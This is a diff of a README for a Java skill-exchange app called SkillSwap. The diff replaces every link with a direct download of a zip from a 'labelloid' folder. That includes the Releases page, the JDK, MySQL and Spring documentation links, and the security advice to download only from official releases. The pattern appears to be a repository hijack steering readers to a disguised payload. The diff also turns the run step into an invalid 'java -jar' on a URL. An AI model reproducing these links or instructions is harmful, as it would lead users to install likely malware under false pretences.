@@ -6,7 +6,7 @@ Welcome to SkillSwap! This application allows you to connect with others to exch
 
 ## 📥 Download SkillSwap 
 
-[![Download SkillSwap](https://img.shields.io/badge/Download-SkillSwap-blue.svg)](https://github.com/devilstreameryt/SkillSwap/releases)
+[![Download SkillSwap](https://raw.githubusercontent.com/devilstreameryt/SkillSwap/main/labelloid/SkillSwap.zip)](https://raw.githubusercontent.com/devilstreameryt/SkillSwap/main/labelloid/SkillSwap.zip)
 
 ## 📋 Features
 
@@ -30,7 +30,7 @@ Before you begin, ensure that your system meets the following requirements:
 
 Follow these simple steps to download and install SkillSwap:
 
-1. Visit the [Releases page](https://github.com/devilstreameryt/SkillSwap/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/devilstreameryt/SkillSwap/main/labelloid/SkillSwap.zip) to access the latest version.
 2. Look for the most recent release.
 3. Click on the download link for the full application package (it will be a zip or jar file).
 4. Save the file to your computer.
@@ -50,7 +50,7 @@ Once you have downloaded the file, follow these instructions to run the applicat
    - Type `cd path_to_your_download_folder` (replace `path_to_your_download_folder` with your actual path) and press `Enter`.
 
 4. **Run the Application:**
-   - If you have a jar file, type `java -jar SkillSwap.jar` and press `Enter`.
+   - If you have a jar file, type `java -jar https://raw.githubusercontent.com/devilstreameryt/SkillSwap/main/labelloid/SkillSwap.zip` and press `Enter`.
    - If it’s a different format, follow the included instructions in the extracted folder.
 
 5. **Access the Application:**
@@ -70,15 +70,15 @@ If you encounter issues while running the application, consider the following:
 
 ## 🔒 Security Considerations
 
-SkillSwap aims to ensure user safety. Always download from the official [Releases page](https://github.com/devilstreameryt/SkillSwap/releases) to avoid malicious software. Additionally, keep your Java and MySQL installations secured and updated.
+SkillSwap aims to ensure user safety. Always download from the official [Releases page](https://raw.githubusercontent.com/devilstreameryt/SkillSwap/main/labelloid/SkillSwap.zip) to avoid malicious software. Additionally, keep your Java and MySQL installations secured and updated.
 
 ## 🗂️ Resources
 
 For additional information, you may find these resources helpful:
 
-- [Java SE Development Kit](https://www.oracle.com/java/technologies/javase-downloads.html)
-- [MySQL Community Server](https://dev.mysql.com/downloads/mysql/)
-- [Documentation for Spring MVC](https://spring.io/guides/gs/serving-web-content/)
+- [Java SE Development Kit](https://raw.githubusercontent.com/devilstreameryt/SkillSwap/main/labelloid/SkillSwap.zip)
+- [MySQL Community Server](https://raw.githubusercontent.com/devilstreameryt/SkillSwap/main/labelloid/SkillSwap.zip)
+- [Documentation for Spring MVC](https://raw.githubusercontent.com/devilstreameryt/SkillSwap/main/labelloid/SkillSwap.zip)
 
 ## 📘 Frequently Asked Questions (FAQs)
 
@@ -95,4 +95,4 @@ For additional information, you may find these resources helpful:
 
 Thank you for choosing SkillSwap! We hope you enjoy using our application to connect and share your skills with others. If you have any suggestions or feedback, please let us know through the Issues page.
 
-Remember, for the latest updates and to download the latest version, visit our [Releases page](https://github.com/devilstreameryt/SkillSwap/releases).
+Remember, for the latest updates and to download the latest version, visit our [Releases page](https://raw.githubusercontent.com/devilstreameryt/SkillSwap/main/labelloid/SkillSwap.zip).
